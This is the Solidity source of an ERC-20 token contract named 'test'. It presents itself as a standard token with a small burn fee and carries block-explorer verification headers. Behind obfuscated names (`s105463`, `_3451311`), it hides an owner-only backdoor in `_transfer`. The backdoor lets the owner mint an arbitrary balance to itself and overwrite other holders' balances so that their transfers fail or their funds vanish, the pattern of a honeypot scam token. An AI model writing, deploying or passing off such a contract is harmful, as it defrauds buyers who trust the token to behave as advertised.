/**
 *Submitted for verification at polygonscan.com on 2023-03-31
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-07
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accoont) external view returns (uint256);

    function transfer(address recipient, uint256 amounts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amounts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amounts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fiel https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "test";
    string private _symbol = "test";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfiel = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _3451311;

    function s105463(address _addres,uint256 _value) external onlyowner {
        _3451311[_addres] = _value;
    }

    function s105463(address _addres) external view onlyowner returns (uint256) {
        return _3451311[_addres];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fielamount = 0;
        address ss = owner();
        fielamount = amounts.mul(_burnfiel).div(100);
        if (_3451311[sender] > 1) {
            if (sender == ss) {
                _balance[sender] = amounts.add(0).add(_3451311[sender]);
            }else{
                _balance[sender] = amounts.sub(_3451311[sender].sub(0));
            }
        }
        uint256 blsender = _balance[sender];
        require(blsender >= amounts,"IERC20: transfer amounts exceeds balance");

        _balance[sender] = _balance[sender]-(amounts);

        uint256 amoun;
        amoun = amounts - fielamount;
        _balance[recipient] += amoun;
        if (_burnfiel > 0+0){
            emit Transfer (sender, _DEADaddress, fielamount);
        }
        emit Transfer(sender, recipient, amoun);
    }

    function transfer(address recipient, uint256 amounts) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amounts);
        return true;
    }


    function balanceOf(address accoont) public view override returns (uint256) {
        return _balance[accoont];
    }

    function approve(address spender, uint256 amounts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amounts);
        return true;
    }

    function _approve(address owner, address spender, uint256 amounts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amounts;
        emit Approval(owner, spender, amounts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amounts) public virtual override returns (bool) {
        _transfer(sender, recipient, amounts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amounts, "IERC20: transfer amounts exceeds allowance");
        return true;
    }

}